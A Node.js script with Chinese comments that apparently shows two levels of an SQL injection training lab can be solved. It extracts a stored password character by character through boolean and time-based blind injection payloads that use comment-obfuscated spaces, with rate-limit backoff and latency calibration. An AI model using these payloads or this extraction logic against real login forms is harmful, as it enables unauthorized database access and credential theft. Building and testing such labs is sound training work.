/**
 * 盲注验证脚本：证明 L3（布尔）/ L4（时间）确实可解
 * 用法：node brute.js 3        → 布尔盲注第 3 关
 *       node brute.js 4 3      → 时间盲注第 4 关，只爆前 3 位
 */
// 默认打本地；想在线上验证：LAB_URL=... SHARECODE=... node brute.js 3 8
const BASE = process.env.LAB_URL || 'http://127.0.0.1:3000';
const SHARE = process.env.SHARECODE ? `&sharecode=${process.env.SHARECODE}` : '';
const B = `${BASE}/check`;
const CHARSET = 'abcdefghijklmnopqrstuvwxyz0123456789_{}-'.split('');

const TX_KEY = 'shen7yin';
// 传输层：异或 + base64，带 v2: 标记（和页面里的编码函数一致）
const toWire = (s) => {
  const b = Buffer.from(s, 'utf8');
  for (let i = 0; i < b.length; i++) b[i] = b[i] ^ TX_KEY.charCodeAt(i % TX_KEY.length);
  return 'v2:' + b.toString('base64');
};

async function ask(level, payload) {
  const url = `${B}?lv=${level}&username=${encodeURIComponent(toWire(payload))}&password=${encodeURIComponent(toWire('x'))}${SHARE}`;
  for (let attempt = 0; attempt < 5; attempt++) {
    const t0 = Date.now();
    const res = await fetch(url);
    if (res.status === 429) { await new Promise((r) => setTimeout(r, 1200)); continue; }
    const body = await res.text();
    return { body, ms: Date.now() - t0 };
  }
  throw new Error('被限流了，调小并发或等一会');
}

async function bruteBool(level, maxLen = 40) {
  let out = '';
  for (let i = 1; i <= maxLen; i++) {
    let hit = null;
    for (const c of CHARSET) {
      const p = `flag'/**/and/**/substr(password,${i},1)=char(${c.charCodeAt(0)})/**/#`;
      const { body } = await ask(level, p);
      if (body.includes('LOGIN SUCCESS')) { hit = c; break; }
    }
    if (!hit) break;
    out += hit;
    process.stdout.write(`\rL${level} 布尔盲注: ${out}`);
  }
  console.log(`\nL${level} 结果: ${out}`);
  return out;
}

async function bruteTime(level, maxLen = 3, sleepSec = 1) {
  // 先标定基线：条件恒假 -> sleep 被短路，测出来的就是"纯网络+进程"延迟。
  // 公网延迟能到 800ms 且抖动大，用固定阈值必然误判，必须按基线来定。
  const base = [];
  for (let k = 0; k < 7; k++) {
    const { ms } = await ask(level, `flag'/**/and/**/1=2/**/and/**/sleep(${sleepSec})/**/#`);
    if (k > 0) base.push(ms); // 第一次是冷启动，抖动大，丢掉
  }
  base.sort((a, b) => a - b);
  const median = base[Math.floor(base.length / 2)];
  // 取中位数而不是最大值：最大值会被一次网络抖动带偏，阈值一高就永远不命中
  const threshold = median + sleepSec * 1000 * 0.55;
  console.log(`L${level} 基线 ${base.join('/')}ms（中位 ${median}）→ 阈值 ${Math.round(threshold)}ms`);

  const isHit = async (p) => {
    const a = await ask(level, p);
    if (a.ms <= threshold) return false;
    const b = await ask(level, p); // 命中要复测一次，避免抖动误判
    return b.ms > threshold;
  };

  let out = '';
  for (let i = 1; i <= maxLen; i++) {
    let hit = null;
    for (const c of CHARSET) {
      const p = `flag'/**/and/**/substr(password,${i},1)=char(${c.charCodeAt(0)})/**/and/**/sleep(${sleepSec})/**/#`;
      if (await isHit(p)) { hit = c; break; }
    }
    if (!hit) break;
    out += hit;
    process.stdout.write(`\rL${level} 时间盲注: ${out}`);
  }
  console.log(`\nL${level} 结果(前 ${maxLen} 位): ${out}`);
  return out;
}

const mode = process.argv[2] === '4' ? 'time' : 'bool';
if (mode === 'time') bruteTime(4, Number(process.argv[3]) || 3, Number(process.argv[4]) || 1).catch((e) => console.error(e));
else bruteBool(3).catch((e) => console.error(e));
